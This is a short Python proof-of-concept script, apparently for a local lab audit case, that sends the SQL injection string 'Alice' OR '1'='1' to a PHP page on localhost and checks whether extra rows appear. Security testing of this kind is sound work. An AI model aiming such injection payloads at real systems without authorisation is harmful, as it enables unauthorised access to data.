import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280/lab_cases/S007/index.php"


def fetch(name: str) -> str:
    query = urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(
        BASE + "?" + query,
        headers={"User-Agent": "S007-sql-audit-poc"},
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read().decode("utf-8", errors="replace")


def main() -> int:
    normal = "Alice"
    test = "Alice' OR '1'='1"

    normal_body = fetch(normal)
    test_body = fetch(test)

    print("normal contains Alice:", "Alice" in normal_body)
    print("normal contains Bob:", "Bob" in normal_body)
    print("normal contains Carol:", "Carol" in normal_body)
    print("test contains Alice:", "Alice" in test_body)
    print("test contains Bob:", "Bob" in test_body)
    print("test contains Carol:", "Carol" in test_body)

    ok_normal = (
        "Alice" in normal_body
        and "Bob" not in normal_body
        and "Carol" not in normal_body
    )
    ok_test = (
        "Alice" in test_body
        and "Bob" in test_body
        and "Carol" in test_body
    )

    if ok_normal and ok_test:
        print("RESULT: SQL injection evidence observed (no data modification).")
        return 0

    print("RESULT: expected pattern not observed; inspect service/db/table context.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
